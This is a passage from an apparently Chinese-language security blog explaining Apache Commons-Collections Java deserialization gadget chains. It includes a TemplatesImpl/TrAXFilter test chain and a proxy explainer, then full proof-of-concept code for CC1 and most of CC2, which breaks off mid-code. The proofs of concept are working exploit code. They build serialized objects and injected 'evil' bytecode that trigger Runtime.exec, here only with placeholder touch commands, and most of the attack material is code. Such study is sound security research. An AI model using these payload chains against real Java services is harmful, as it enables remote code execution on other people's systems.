<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]</span><br></pre></td></tr></table></div></figure>

<p>对比一下在没有序列化时的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105946768.png" alt="image-20220802105946768"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]</span><br></pre></td></tr></table></div></figure>

<p>是完全一样的，那么就会调用到<code>newTransform</code>来调用相关字节码</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1535" >Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="经典链子CITTN"   >
          <a href="#经典链子CITTN" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子CITTN" class="headerlink" title="经典链子CITTN"></a>经典链子CITTN</h1>
      <p><code>ChainedTransformer-&gt;ConstantTransformer-&gt;InstantiateTransformer-&gt;TrAXFilter-&gt;TemplatesImpl</code></p>
<p>同样为了方便自己命名为<code>CITTN</code></p>

        <h2 id="测试链"   >
          <a href="#测试链" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试链" class="headerlink" title="测试链"></a>测试链</h2>
      <p>即结合之前提到的这几个类，也能想出相关的链子，相关测试如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch bbbb\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        chain.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-1"   >
          <a href="#解析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-1" class="headerlink" title="解析"></a>解析</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110014361.png" alt="image-20220806110014361"></p>
<p>首先自然还是<code>ChainedTransformer</code>中的数组调用<code>transform</code>函数，之后调用<code>ConstantTransformer</code>的<code>transform</code>函数，获取到<code>TrAXFilter</code>类后，再调用<code>InstantiateTransformer</code>的<code>transform</code>函数，其中会生成<code>TrAXFilter</code>的实例化对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806112255293.png" alt="image-20220806112255293"></p>
<p>随后即可进入<code>TrAXFilter</code>的构造函数，传入的<code>this.iArgs</code>即为实例化<code>InstantiateTransformer</code>时传入的<code>Templates</code>对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110523351.png" alt="image-20220806110523351"></p>
<p>然后就调用到利用反射为<code>Templates</code>对象准备的字节码<code>_bytecodes</code>，从而完成任意函数执行。</p>

        <h1 id="一、CC1"   >
          <a href="#一、CC1" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、CC1" class="headerlink" title="一、CC1"></a>一、CC1</h1>
      
        <h2 id="前置知识-4"   >
          <a href="#前置知识-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>主要是动态代理对象的知识</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/118811585445582" >Java安全漫谈 - 11.反序列化篇(5)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="InvocationHandler"   >
          <a href="#InvocationHandler" class="heading-link"><i class="fas fa-link"></i></a><a href="#InvocationHandler" class="headerlink" title="InvocationHandler"></a>InvocationHandler</h3>
      <p>有一个和<code>Transformer</code>接口很像的类<code>InvocationHandler</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当该代理对象调用任意方法时，都会被替换为调用之前传入的实现了<code>InvocationHandler</code>类下重写的<code>invoke</code>方法，以下是个简单的例子。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//声明一个实现了InvocationHandler接口的类</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> Map map;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">(Map map)</span></span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.map = map;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Calling invoke....&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Hacked return string&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.map,args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler = <span class="keyword">new</span> Demo(<span class="keyword">new</span> HashMap());</span><br><span class="line">        <span class="comment">//代理时传入实现了InvocationHandler接口的类的实例对象,返回代理对象proxyMap</span></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">        <span class="comment">//当代理对象proxyMap调用任意方法时,都会被之前传入的实现了</span></span><br><span class="line">        <span class="comment">//InvocationHandler接口的类下重写的invoke方法给替换掉</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//比如这里的put和get都会被Demo.invoke给替换掉</span></span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        String result = (String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>那么就有希望调用到某个类的<code>invoke</code>函数了，这里的<code>CC1</code>即选取的尝试调用<code>AnnotationInvocationHandler.invoke()</code></p>

        <h2 id="JAVA源码版本-8u40"   >
          <a href="#JAVA源码版本-8u40" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803181047725.png" alt="image-20220803181047725"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制"   >
          <a href="#限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：<code>8u71</code>及以前版本，原因是在<code>8u71</code>之后的版本中<code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()</code>函数发生了变化。</p>

        <h2 id="POC"   >
          <a href="#POC" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                   <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch aaaaa&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap) LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个与代理对象相关联的InvocationHandler map_handler</span></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理对象proxy_map来代理map_handler，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法</span></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再创建一个AnnotationInvocationHandler对象，用来触发代理对象proxy_map的方法执行,从而跳转AnnotationInvocationHandler.voker()</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc1&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc1&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-2"   >
          <a href="#解析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-2" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="AnnotationInvocationHandler-readObject"   >
          <a href="#AnnotationInvocationHandler-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#AnnotationInvocationHandler-readObject" class="headerlink" title="AnnotationInvocationHandler.readObject()"></a><code>AnnotationInvocationHandler.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803201921921.png" alt="image-20220803201921921"></p>

        <h3 id="AnnotationInvocationHandler-invoke"   >
          <a href="#AnnotationInvocationHandler-invoke" class="heading-link"><i class="fas fa-link"></i></a><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a><code>AnnotationInvocationHandler.invoke()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803203105622.png" alt="image-20220803203105622"></p>

        <h3 id="LazyMap-get"   >
          <a href="#LazyMap-get" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h1 id="二、CC2"   >
          <a href="#二、CC2" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、CC2" class="headerlink" title="二、CC2"></a>二、CC2</h1>
      
        <h2 id="JAVA源码版本-8u40-1"   >
          <a href="#JAVA源码版本-8u40-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-1" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805162929023.png" alt="image-20220805162929023"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Templateslmpl.newTransfomer()</span><br></pre></td></tr></table></div></figure>

<p><code>PriorityQueue</code>在<code>commons-collections4</code>下才开始有</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-1"   >
          <a href="#限制-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-1"   >
          <a href="#POC-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor constructor = 